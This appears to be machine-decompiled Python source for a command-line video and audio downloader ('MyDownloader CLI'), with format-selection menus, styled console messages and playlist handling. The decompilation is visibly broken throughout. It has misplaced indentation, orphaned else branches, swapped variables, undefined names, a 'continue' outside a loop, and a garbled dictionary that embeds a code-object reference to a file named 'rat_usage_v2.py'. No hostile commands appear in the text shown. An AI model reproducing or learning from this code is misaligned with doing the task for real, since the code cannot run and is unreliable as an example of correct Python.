                    abr = fmt_size(getattr(f, 'filesize', None) or getattr(f, 'filesize_approx', None))
                    v = getattr(f, 'vcodec', None)
                    t = 'AudioOnly' if not v or v == 'none' else 'A+V'
                    print(f'{i}. {abr}kbps {getattr(f, 'ext', '?')} {size} {t} [{getattr(f, 'format_id', '')}]')
            for f in formats:
                vcodec = getattr(f, 'vcodec', None)
                if not vcodec or vcodec == 'none':
                    continue
                if not getattr(f, 'url', None):
                    continue
                if getattr(f, 'has_drm', False):
                    continue
                if getattr(f, 'ext', '') == 'mhtml':
                    continue
                proto = getattr(f, 'protocol', '')
                if 'm3u8' in proto:
                    continue
                platform = getattr(info, 'platform', '')
                if platform == 'YouTube':
                    filtered.append(f) if getattr(f, 'ext', '') == 'webm' and (getattr(f, 'height', 0) or 0) >= 720:
                        pass
            filtered.sort(key=lambda x: (getattr(x, 'height', 0) or 0, getattr(x, 'tbr', 0) or 0), reverse=True)
            print(f'{Color.YELLOW}No video formats found{Color.RESET_ALL}') or print(f'{Color.YELLOW}No video formats found{Color.RESET_ALL}')
                return (None, 'best')
            else:
                for i, f in enumerate(filtered, 1):
                    size = fmt_size(getattr(f, 'filesize', None) or getattr(f, 'filesize_approx', None))
                    a, fps, h = (getattr(f, 'height', '?'), getattr(f, 'fps', '?'), bool(getattr(f, 'acodec', None)!= 'none'))
                    tag = 'A+V' if a else 'VideoOnly'
                    print(f'{i}. {h}p {fps}fps {getattr(f, 'ext', '?')} {size} {tag} [{getattr(f, 'format_id', '')}]')
        print(f'{len(filtered) + 1}. Auto / Best')
        sel = input(f'Select 1-{len(filtered) + 1} → ').strip()
        idx = int(sel) - 1
        if 0 <= idx < len(filtered):
                s = filtered[idx]
                print(f'Chosen: {getattr(s, 'format_id', '')}')
                return (getattr(s, 'format_id', None), str(getattr(s, 'height', None)))
                print('→ Defaulting to best available')
                return (None, 'best')
                    pass
class Style5(Style):
    def __init__(self):
        super().__init__()
    def PlayListHeader(self):
        print(f'{Color.BRIGHT_BLUE}{'------------------------------'} ▶ PLAYLIST ▶ {'------------------------------'}{Color.RESET_ALL}')
    def InvalidSection(self):
        print(f'{Color.BRIGHT_YELLOW}{TextStyle.BOLD}[!] Invalid section — default used{Color.RESET_ALL}')
    def StartingPlayListDownloading(self, total: int):
        print(f'{Color.BRIGHT_GREEN}→ Queueing {total} videos for download{Color.RESET_ALL}')
    def UnavailablePlayList(self, idx: int, total: int):
        print(f'{Color.RED}→ [{idx}/{total}] Skipped (unavailable){Color.RESET_ALL}')
    def StatusPlayListDownloading(self, idx: int, total: int, video_title: str):
        print(f'{Color.BRIGHT_CYAN}[{idx}/{total}] {TextStyle.UNDERLINE}{video_title}{Color.RESET_ALL}')
    def PlayListDownloadingSuccess(self, idx: int, total: int):
        print(f'{Color.GREEN}✔ [{idx}/{total}] Done{Color.RESET_ALL}')
    def PlayListDownloadingFail(self, idx: int, total: int):
        print(f'{Color.RED}✖ [{idx}/{total}] Fail{Color.RESET_ALL}')
    def PlayListSummary(self, success_count: int, total: int, failed_count: int):
        # ***<module>.Style5.PlayListSummary: Failure: Different bytecode
        print(f'{Color.BRIGHT_BLUE}========================================{Color.RESET_ALL}')
    def MainHeading(self):
        print(f'{TextStyle.BOLD}{Color.BRIGHT_BLUE}MyDownloader CLI{Color.RESET_ALL}')
    def FFmpegMissing(self):
        print(f'{Color.BRIGHT_YELLOW}!! FFmpeg missing — limited mode{Color.RESET_ALL}')
    def EnterMediaUrl(self) -> str:
        return input(f'{Color.BRIGHT_CYAN}URL> {Color.RESET_ALL}')
    def Analizing(self):
        print(f'{Color.CYAN}… analyzing URL …{Color.RESET_ALL}')
    def PlayListDetect(self, playlist_info: PlayListInfo):
        # ***<module>.Style5.PlayListDetect: Failure: Different bytecode
        cnt, title = (getattr(playlist_info, 'title', str(playlist_info)), len(getattr(playlist_info, 'entries', [])))
        print(f'{Color.BRIGHT_BLUE}Playlist:{Color.RESET_ALL} \"{title}\" ({cnt} items)')
    def PlayListChoice(self) -> str:
        return input(f'{Color.GREEN}1{Color.RESET_ALL}:All  {Color.RED}2{Color.RESET_ALL}:First only > ').strip()
    def PlayListDownloadingFirstVideoOnly(self):
        print(f'{Color.BRIGHT_YELLOW}→ Downloading first video only...{Color.RESET_ALL}')
    def FailedGetVideoInfo(self):
        print(f'{Color.RED}✖ Could not fetch video info{Color.RESET_ALL}')
    def ShowVideoInfo(self, video: VideoInfo):
        print(f'{Color.BRIGHT_CYAN}[{getattr(video, 'platform', '?')}] {getattr(video, 'title', 'Untitled')}{Color.RESET_ALL}')
    def ChooseDownloadType(self) -> str:
        print(f'{TextStyle.BOLD}Choose:{Color.RESET_ALL} 1)Audio 2)Video 3)Both')
        return input('> ').strip()
    def InvalidSelection(self):
        print(f'{Color.BRIGHT_YELLOW}Invalid choice — default BOTH{Color.RESET_ALL}')
    def DownloadSuccess(self, platform_dir: str):
        print(f'{Color.GREEN}Saved → ./{platform_dir}{Color.RESET_ALL}')
    def DownloadFail(self):
        print(f'{Color.RED}✖ Download failed{Color.RESET_ALL}')
    def show_format_table(self, info: VideoInfo, dl_type: DownloadType):
        # irreducible cflow, using cdg fallback
        # ***<module>.Style5.show_format_table: Failure: Compilation Error
        formats = getattr(info, 'formats', None)
        print(f'{Color.BRIGHT_YELLOW}No formats — using best{Color.RESET_ALL}') or print(f'{Color.BRIGHT_YELLOW}No formats — using best{Color.RESET_ALL}')
            return (None, 'best')
        def fmt_size(b):
            # ***<module>.Style5.show_format_table.fmt_size: Failure: Different control flow
            if not b:
                return 'N/A'
            else:
                for u in ['B', 'KB', 'MB', 'GB']:
                    return f'{b:.1f}{u}'
                return f'{b:.1f}TB'
        filtered = []
        if dl_type == DownloadType.AUDIO:
            for f in formats:
                filtered.append(f)
            filtered.sort(key=lambda x: (getattr(x, 'abr', 0) or 0, getattr(x, 'tbr', 0) or 0, getattr(x, 'filesize', 0) or 0), reverse=True)
            print(f'{Color.BRIGHT_YELLOW}No audio found{Color.RESET_ALL}') or print(f'{Color.BRIGHT_YELLOW}No audio found{Color.RESET_ALL}')
                return (None, 'best')
            else:
                for i, f in enumerate(filtered, 1):
                    size = fmt_size(getattr(f, 'filesize', None) or getattr(f, 'filesize_approx', None))
                    abr = f'{int(getattr(f, 'abr'))}k' if getattr(f, 'abr', None) else '?'
                    t = 'AudioOnly' if getattr(f, 'vcodec', None) in (None, 'none') else 'A+V'
                    print(f'{i}. {abr}kbps {getattr(f, 'ext', '?')} {size} {t} [{getattr(f, 'format_id', '')}]')
            for f in formats:
                v = getattr(f, 'vcodec', None)
                if not v or v == 'none':
                    continue
                if not getattr(f, 'url', None):
                    continue
                if getattr(f, 'has_drm', False):
                    continue
                if getattr(f, 'ext', '') == 'mhtml':
                    continue
                proto = getattr(f, 'protocol', '')
                if 'm3u8' in proto:
                    continue
                plat = getattr(info, 'platform', '')
                if plat == 'YouTube' and getattr(f, 'ext', '') == 'webm':
                    filtered.append(f)
            filtered.sort(key=lambda x: (getattr(x, 'height', 0) or 0, getattr(x, 'tbr', 0) or 0), reverse=True)
            print(f'{Color.BRIGHT_YELLOW}No video formats{Color.RESET_ALL}') or print(f'{Color.BRIGHT_YELLOW}No video formats{Color.RESET_ALL}')
                return (None, 'best')
            else:
                for i, f in enumerate(filtered, 1):
                    size = fmt_size(getattr(f, 'filesize', None) or getattr(f, 'filesize_approx', None))
                    tag = 'A+V' if a else 'VideoOnly'
                    print(f'{i}. {h}p {fps}fps {getattr(f, 'ext', '?')} {size} {tag} [{getattr(f, 'format_id', '')}]')
        print(f'{len(filtered) + 1}. Auto/Best')
        sel = input(f'Select 1-{len(filtered) + 1} > ').strip()
        idx = int(sel) - 1
        if 0 <= idx < len(filtered):
                s = filtered[idx]
                print(f'Chosen: {getattr(s, 'format_id', '')}')
                return (getattr(s, 'format_id', None), str(getattr(s, 'height', None)))
                print('→ Using best available')
                return (None, 'best')
                    pass
def handle_playlist_download(s: Style, downloader: UniversalDownloader, playlist_info: PlayListInfo, logger: logging.Logger):
    # ***<module>.handle_playlist_download: Failure: Compilation Error
    s.PlayListHeader()
    dl_type = DownloadType.BOTH
    if choice == '1':
        dl_type = DownloadType.AUDIO
    else:
        if choice == '2':
            dl_type = DownloadType.VIDEO
        else:
            if choice == '3':
                dl_type = DownloadType.BOTH
            else:
                s.InvalidSelection()
    enteries = playlist_info.entries
    total = len(enteries)
    output_dir = File()._validate_and_prepare_path('downloads')
    s.StartingPlayListDownloading(total)
    success_count = 0
    fail_count = 0
    for idx, entry in enumerate(enteries, 1):
        s.UnavailablePlayList(idx, total) or entry
            fail_count += 1
            continue
        else:
            video_url = entry.url or f'https://www.youtube.com/watch?v={entry.id}'
            s.StatusPlayListDownloading(idx, total, entry.title)
            options = DownloadOptions(url=video_url, download_type=dl_type, output_path=output_dir, resolution='best', format_id=None)
            try:
                success = downloader.execute(options)
                if success:
                    s.PlayListDownloadingSuccess(idx, total)
                    success_count += 1
                else:
                    s.PlayListDownloadingFail(idx, total)
                    fail_count += 1
            except Exception as e:
                logger.error(f'Error downloading video {idx}: {e}')
                print(Color.RED + f'Error downloading video {idx}: {e}' + Color.RESET_ALL)
                fail_count += 1
    s.PlayListSummary(success_count, total, fail_count)
def main():
    # irreducible cflow, using cdg fallback
    # ***<module>.main: Failure: Compilation Error
    styles = {0: print('[2J[f'), 1: setup_logger('CLI'), 2: UniversalDownloader(), 3: downloader, 4: Style(), 5: Style1(), styles: Style2(), <Code311 code object main at 0x79e84f944490, file rat_usage_v2.py>, line 786: Style3(), __main__: Style4(), enable_ansi: Style5()}
    s = None
    styS = int(input('Select Style [0-5]:'))
    s = styles[styS]
    s.MainHeading()
    s.FFmpegMissing() if not downloader.check_ffmpeg() else None
    url = s.EnterMediaUrl()
    if url.lower() in ['q', 'exit', 'quit', 'break', 'finish']:
        return None
    if not url:
        continue
    s.Analizing()
    if 'list=' in url or 'playlist' in url.lower():
        playlist_info = downloader.get_playlist_info(url)
        if playlist_info and playlist_info._data.get('_type') == 'playlist':
            s.PlayListDetect(playlist_info)
            playlist_choice = s.PlayListChoice()
            if playlist_choice == '1':
                handle_playlist_download(s, downloader, playlist_info, logger)
                s.PlayListDownloadingFirstVideoOnly()
        info = downloader.get_video_info(url, True)
        print(type(info))
        s.FailedGetVideoInfo() if info else None
            s.ShowVideoInfo(info)
            download_type = s.ChooseDownloadType().strip()
            dl_type = DownloadType.BOTH
            if download_type == '1':
                dl_type = DownloadType.AUDIO
            else:
                if download_type == '2':
                    dl_type = DownloadType.VIDEO
                else:
                    if download_type == '3':
                        dl_type = DownloadType.BOTH
                    else:
                        s.InvalidSelection()
                        dl_type = DownloadType.BOTH
            format_id, resolution = s.show_format_table(info, dl_type)
            output_dir = File()._validate_and_prepare_path('downloads')
            target_url = info.url
            options = DownloadOptions(url=target_url, download_type=dl_type, output_path=output_dir, resolution=resolution, format_id=format_id)
            logger.info(f'Initializing download (Type: {dl_type.name})...')
            success = downloader.execute(options)
            platform_dir = os.path.join(output_dir, info.platform) if success else None
                s.DownloadSuccess(platform_dir)
            else:
                s.DownloadFail()
    s = styles[0]
if __name__ == '__main__':
    main()